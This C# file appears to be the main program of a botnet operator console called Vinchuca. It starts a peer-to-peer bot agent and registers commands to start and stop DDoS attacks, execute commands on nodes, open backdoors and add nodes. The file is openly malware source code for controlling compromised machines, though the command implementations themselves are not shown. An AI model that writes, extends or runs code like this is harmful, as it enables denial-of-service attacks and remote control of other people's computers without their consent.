using System;
using Mono.Options;
using REPL.Commands;
using Vinchuca;
using Vinchuca.Network;

namespace REPL
{
    class Program
    {
        static void Main(string[] args)
        {
            var repl = new CommandLineReader();
            var agent = new Agent(33332, BotIdentifier.Id);
            agent.Run();
            agent.Bootstrap();


            var suite = new CommandSet("vicha") {
                "usage: COMMAND [OPTIONS]+.",
                "Available commands are:",
                "",
		        new DDoSStartCommand(agent, repl),
                new DDoSStopCommand(agent, repl),
                new ExecuteCommand(agent, repl),
                new BackdoorCommand(agent, repl),
                new AddNodeCommand(agent, repl),
                new DebugCommand(agent, repl),
                new Command("clear", "Clear the screen")
                {
                    Run = x=>repl.Clear()
                },
                new Command("exit", "Finished the control seesion and close the agent")
                {
                    Run = x=>Environment.Exit(0)
                }
            };
            
            repl.NewCommand += (sender, eventArgs) =>
                suite.Run(eventArgs.Command.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries));
            repl.Run();

        }
    }
}
